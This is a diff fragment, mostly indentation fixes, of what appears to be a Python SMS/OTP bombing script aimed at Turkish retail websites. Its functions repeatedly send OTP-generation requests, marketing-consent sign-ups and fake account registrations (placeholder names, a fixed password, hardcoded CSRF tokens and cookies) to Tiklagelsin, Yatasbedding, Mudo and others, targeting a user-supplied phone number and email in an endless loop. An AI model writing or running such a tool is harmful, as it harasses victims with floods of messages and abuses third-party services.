+                'x-csrftoken': 'YEXgtwHReXOA5CNLsg2M6xmdEogNlcC0vLX8Lj9LTxvZyBC79YQe7SBRgF4xk6kW',
+                'x-kl-kis-ajax-request': 'Ajax_Request',
             }
             json_data = {
-            'operationName': 'GENERATE_OTP',
-            'variables': {
-            'phone': f'+90{phone}',
-            'challenge': 'a8e312c5-9cf2-4053-a13e-51d259b0d36f',
-            'deviceUniqueId': 'web_f312069b-d80b-40d9-9db1-e5799461c3ae',
-            },
-            'query': 'mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n',
+                'operationName': 'GENERATE_OTP',
+                'variables': {
+                    'phone': f'+90{phone}',
+                    'challenge': 'a8e312c5-9cf2-4053-a13e-51d259b0d36f',
+                    'deviceUniqueId': 'web_f312069b-d80b-40d9-9db1-e5799461c3ae',
+                },
+                'query': 'mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n',
             }
             response = requests.post('https://www.tiklagelsin.com/user/graphql', headers=headers, json=json_data)
             print(Fore.LIGHTGREEN_EX + "[+]" + "Tiklagelsin ====> https://www.tiklagelsin.com"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Tiklagelsin Arıza"+ Style.RESET_ALL)            
+            print(Fore.LIGHTRED_EX + "[-]" + "Tiklagelsin Arıza"+ Style.RESET_ALL)
     def yatas():
         try:
-                cookies = {
+            cookies = {
                 'inCommerce.customer.info': '60b0fd06-c1e4-4154-bbff-748db9ab39ad',
                 '_gcl_au': '1.1.1849608548.1709214025',
                 'personaclick_session_code': 'MfyLGn9a4z',
@@ -1261,8 +1261,8 @@ while True:
                 'cookie_consent_level': '%7B%22strictly-necessary%22%3Atrue%2C%22functionality%22%3Atrue%2C%22tracking%22%3Atrue%2C%22targeting%22%3Atrue%7D',
                 'cookie_consent_user_accepted': 'true',
                 '_ga_4KM79XB6T8': 'GS1.1.1709214027.1.1.1709214065.22.0.0',
-                }
-                headers = {
+            }
+            headers = {
                 'authority': 'www.yatasbedding.com.tr',
                 'accept': '*/*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -1278,65 +1278,65 @@ while True:
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                 'x-requested-with': 'XMLHttpRequest',
-                }
+            }
 
-                json_data = {
+            json_data = {
                 'EmailPermission': True,
                 'SmsPermission': True,
                 'FirstName': f'{ad}',
                 'LastName': f'{soyad}',
                 'Phone': f'{phone}',
                 'Email': f'{mail}',
-                }
+            }
 
-                response = requests.post(
+            response = requests.post(
                 'https://www.yatasbedding.com.tr/Customer/SendRegisterCustomerPermissionWithModel',
                 cookies=cookies,
                 headers=headers,
                 json=json_data,
-                )
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Yatasbedding ====> https://www.yatasbedding.com.tr"+ Style.RESET_ALL)
+            )
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Yatasbedding ====> https://www.yatasbedding.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTWHITE_EX + "[-]" + "Yatasbedding Arıza"+ Style.RESET_ALL) 
+            print(Fore.LIGHTWHITE_EX + "[-]" + "Yatasbedding Arıza"+ Style.RESET_ALL)
     def mudo():
         try:
             headers = {
-            'authority': 'www.mudo.com.tr',
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'application/json',
-            # 'cookie': 'csrftoken=7wTaZl5u8OvDux6c1CB6mRt25768Z8JKtQGgfZ55RMq46TsMGGQwZFVfQH6rjrj0; _pk_id.6.f3bc=4db35b46c263c906.1708802588.; osessionid=gh0uul8s37px2mkpswm4iq2x9ygb5gah; _pk_ref.6.f3bc=%5B%22%22%2C%22%22%2C1709040646%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.6.f3bc=1',
-            'origin': 'https://www.mudo.com.tr',
-            'referer': 'https://www.mudo.com.tr/users/register/?next=',
-            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-            'x-csrftoken': 'jL7ebwLGqVCvcpTfgQUMzDfkClCd94lxF5UkraLh9TxWOLfPVU9ccrHxnVCwtnVN',
-            'x-kl-kis-ajax-request': 'Ajax_Request',
+                'authority': 'www.mudo.com.tr',
+                'accept': 'application/json, text/plain, */*',
+                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+                'content-type': 'application/json',
+                # 'cookie': 'csrftoken=7wTaZl5u8OvDux6c1CB6mRt25768Z8JKtQGgfZ55RMq46TsMGGQwZFVfQH6rjrj0; _pk_id.6.f3bc=4db35b46c263c906.1708802588.; osessionid=gh0uul8s37px2mkpswm4iq2x9ygb5gah; _pk_ref.6.f3bc=%5B%22%22%2C%22%22%2C1709040646%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.6.f3bc=1',
+                'origin': 'https://www.mudo.com.tr',
+                'referer': 'https://www.mudo.com.tr/users/register/?next=',
+                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+                'x-csrftoken': 'jL7ebwLGqVCvcpTfgQUMzDfkClCd94lxF5UkraLh9TxWOLfPVU9ccrHxnVCwtnVN',
+                'x-kl-kis-ajax-request': 'Ajax_Request',
             }
 
             json_data = {
-            'email': f'{mail}',
-            'sms_allowed': True,
-            'email_allowed': True,
-            'first_name': 'ASDASD',
-            'last_name': 'Ssddsds',
-            'date_of_birth': '2002-11-04',
-            'gender': None,
-            'confirm': True,
-            'password': 'asdWEGHGD1@',
-            'phone': f'{phone}',
-            'add_loyalty': True,
+                'email': f'{mail}',
+                'sms_allowed': True,
+                'email_allowed': True,
+                'first_name': 'ASDASD',
+                'last_name': 'Ssddsds',
+                'date_of_birth': '2002-11-04',
+                'gender': None,
+                'confirm': True,
+                'password': 'asdWEGHGD1@',
+                'phone': f'{phone}',
+                'add_loyalty': True,
             }
 
             response = requests.post('https://www.mudo.com.tr/users/register/', headers=headers, json=json_data)
             print(Fore.LIGHTGREEN_EX + "[+]" + "Mudo ====> https://www.mudo.com.tr"+ Style.RESET_ALL)
         except:
-            print(Fore.LIGHTRED_EX + "[-]" + "Mudo Arıza"+ Style.RESET_ALL)   
+            print(Fore.LIGHTRED_EX + "[-]" + "Mudo Arıza"+ Style.RESET_ALL)
     while True:
         system("cls||clear")
         try:
@@ -1362,7 +1362,7 @@ while True:
                 print(Fore.LIGHTRED_EX +"Telefon Numarası 10 haneli olmalıdır." + Style.RESET_ALL)
                 continue
             else :
-                system("cls||clear")    
+                system("cls||clear")
                 while True:
                     yatas()
                     Columbia()
@@ -1397,6 +1397,6 @@ while True:
                     flormar()
                     derimod()
                     koton()
-                    
+
         if menu == "3":
             exit(0)
